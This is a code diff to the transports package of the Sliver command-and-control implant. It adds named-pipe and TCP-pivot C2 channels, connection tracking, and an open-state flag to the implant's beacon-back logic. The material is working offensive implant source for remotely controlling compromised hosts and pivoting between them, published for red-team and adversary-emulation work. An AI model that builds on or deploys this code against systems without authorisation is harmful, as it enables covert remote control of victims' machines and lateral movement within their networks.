@@ -19,27 +19,32 @@ package transports
 */
 
 import (
-	"crypto/x509"
-	"io"
 
-	// {{if .HTTPc2Enabled}}
+	// {{if or .HTTPc2Enabled .TCPPivotc2Enabled}}
 	"net"
 	// {{end}}
-	"net/url"
+	
 
 	// {{if .Debug}}
 	"log"
 	// {{end}}
 
+	"crypto/x509"
+	"net/url"
 	"os"
 	"strconv"
 	"sync"
 	"time"
+	"io"
 
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
 	// {{if .HTTPc2Enabled}}
 	"github.com/golang/protobuf/proto"
+	// {{end}}
+
+	// {{if .TCPPivotc2Enabled}}
+	"strings"
 	// {{end}}
 )
 
@@ -55,12 +60,14 @@ var (
 	ccCounter = new(int)
 
 	activeC2 string
+	activeConnection *Connection
 )
 
 // Connection - Abstract connection to the server
 type Connection struct {
 	Send    chan *pb.Envelope
 	Recv    chan *pb.Envelope
+	IsOpen  bool
 	ctrl    chan bool
 	cleanup func()
 	once    *sync.Once
@@ -70,7 +77,10 @@ type Connection struct {
 
 // Cleanup - Execute cleanup once
 func (c *Connection) Cleanup() {
-	c.once.Do(c.cleanup)
+	c.once.Do(func(){
+		c.cleanup()
+		c.IsOpen = false
+	})
 }
 
 // Tunnel - Duplex byte read/write
@@ -127,6 +137,7 @@ func StartConnectionLoop() *Connection {
 			connection, err = mtlsConnect(uri)
 			if err == nil {
 				activeC2 = uri.String()
+				activeConnection = connection
 				return connection
 			}
 			// {{if .Debug}}
@@ -143,6 +154,7 @@ func StartConnectionLoop() *Connection {
 			connection, err = httpConnect(uri)
 			if err == nil {
 				activeC2 = uri.String()
+				activeConnection = connection
 				return connection
 			}
 			// {{if .Debug}}
@@ -157,6 +169,7 @@ func StartConnectionLoop() *Connection {
 			connection, err = dnsConnect(uri)
 			if err == nil {
 				activeC2 = uri.String()
+				activeConnection = connection
 				return connection
 			}
 			// {{if .Debug}}
@@ -165,14 +178,43 @@ func StartConnectionLoop() *Connection {
 			connectionAttempts++
 			// {{end}} - DNSc2Enabled
 
+		case "namedpipe":
+			// *** Named Pipe ***
+			// {{if .NamePipec2Enabled}}
+			connection, err = namedPipeConnect(uri)
+			if err == nil {
+				activeC2 = uri.String()
+				activeConnection = connection
+				return connection
+			}
+			// {{if .Debug}}
+			log.Printf("[namedpipe] Connection failed %s", err)
+			// {{end}}
+			connectionAttempts++
+			// {{end}} -NamePipec2Enabled
+
+		case "tcppivot":
+			// {{if .TCPPivotc2Enabled}}
+			connection, err = tcpPivotConnect(uri)
+			if err == nil {
+				activeC2 = uri.String()
+				activeConnection = connection
+				return connection
+			}
+			// {{if .Debug}}
+			log.Printf("[tcppivot] Connection failed %s", err)
+			// {{end}}
+			connectionAttempts++
+			// {{end}} -TCPPivotc2Enabled
+
 		default:
 			// {{if .Debug}}
 			log.Printf("Unknown c2 protocol %s", uri.Scheme)
 			// {{end}}
 		}
-
+		
 		// {{if .Debug}}
-		log.Printf("sleep ...")
+		log.Printf("Sleep ...")
 		// {{end}}
 		time.Sleep(reconnectInterval)
 	}
@@ -192,6 +234,11 @@ var ccServers = []string{
 // GetActiveC2 returns the URL of the C2 in use
 func GetActiveC2() string {
 	return activeC2
+}
+
+// GetActiveConnection returns the Connection of the C2 in use
+func GetActiveConnection() *Connection {
+	return activeConnection
 }
 
 func nextCCServer() *url.URL {
@@ -243,6 +290,7 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 		tunnels: &map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
 		once:    &sync.Once{},
+		IsOpen:  true,
 		cleanup: func() {
 			// {{if .Debug}}
 			log.Printf("[mtls] lost connection, cleanup...")
@@ -273,6 +321,7 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 		}
 	}()
 
+	activeConnection = connection
 	return connection, nil
 }
 
@@ -302,6 +351,7 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 		tunnels: &map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
 		once:    &sync.Once{},
+		IsOpen:  true,
 		cleanup: func() {
 			// {{if .Debug}}
 			log.Printf("[http] lost connection, cleanup...")
@@ -365,6 +415,7 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 		}
 	}()
 
+	activeConnection = connection
 	return connection, nil
 }
 
@@ -394,6 +445,7 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 		tunnels: &map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
 		once:    &sync.Once{},
+		IsOpen:  true,
 		cleanup: func() {
 			// {{if .Debug}}
 			log.Printf("[dns] lost connection, cleanup...")
@@ -416,10 +468,128 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 		dnsSessionPoll(dnsParent, sessionID, sessionKey, ctrl, recv)
 	}()
 
+	activeConnection = connection
 	return connection, nil
 }
 
 // {{end}} - .DNSc2Enabled
+
+// {{if .NamePipec2Enabled}}
+func namedPipeConnect(uri *url.URL) (*Connection, error) {
+	conn, err := namePipeDial(uri)
+	if err != nil {
+		return nil, err
+	}
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan bool, 1)
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		ctrl:    ctrl,
+		tunnels: &map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		IsOpen:  true,
+		cleanup: func() {
+			// {{if .Debug}}
+			log.Printf("[namedpipe] lost connection, cleanup...")
+			// {{end}}
+			close(send)
+			ctrl <- true
+			close(recv)
+		},
+	}
+
+	go func() {
+		defer connection.Cleanup()
+		for envelope := range send {
+			// {{if .Debug}}
+			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
+			// {{end}}
+			namedPipeWriteEnvelope(&conn, envelope)
+		}
+	}()
+
+	go func() {
+		defer connection.Cleanup()
+		for {
+			envelope, err := namedPipeReadEnvelope(&conn)
+			if err == io.EOF {
+				break
+			}
+			if err == nil {
+				recv <- envelope
+				// {{if .Debug}}
+				log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
+				// {{end}}
+			}
+		}
+	}()
+	activeConnection = connection
+	return connection, nil
+}
+
+// {{end}} -NamePipec2Enabled
+
+// {{if .TCPPivotc2Enabled}}
+func tcpPivotConnect(uri *url.URL) (*Connection, error) {
+	addr := strings.ReplaceAll(uri.String(), "tcppivot://", "")
+	conn, err := net.Dial("tcp", addr)
+	if err != nil {
+		return nil, err
+	}
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan bool, 1)
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		ctrl:    ctrl,
+		tunnels: &map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		IsOpen:  true,
+		cleanup: func() {
+			// {{if .Debug}}
+			log.Printf("[tcp-pivot] lost connection, cleanup...")
+			// {{end}}
+			close(send)
+			ctrl <- true
+			close(recv)
+		},
+	}
+
+	go func() {
+		defer connection.Cleanup()
+		for envelope := range send {
+			// {{if .Debug}}
+			log.Printf("[tcp-pivot] send loop envelope type %d\n", envelope.Type)
+			// {{end}}
+			tcpPivoteWriteEnvelope(&conn, envelope)
+		}
+	}()
+
+	go func() {
+		defer connection.Cleanup()
+		for {
+			envelope, err := tcpPivotReadEnvelope(&conn)
+			if err == io.EOF {
+				break
+			}
+			if err == nil {
+				recv <- envelope
+				// {{if .Debug}}
+				log.Printf("[tcp-pivot] Receive loop envelope type %d\n", envelope.Type)
+				// {{end}}
+			}
+		}
+	}()
+	activeConnection = connection
+	return connection, nil
+}
+
+// {{end}} -TCPPivotc2Enabled
 
 // rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
 // we have to disable all of the fucking certificate validation and re-implement everything.
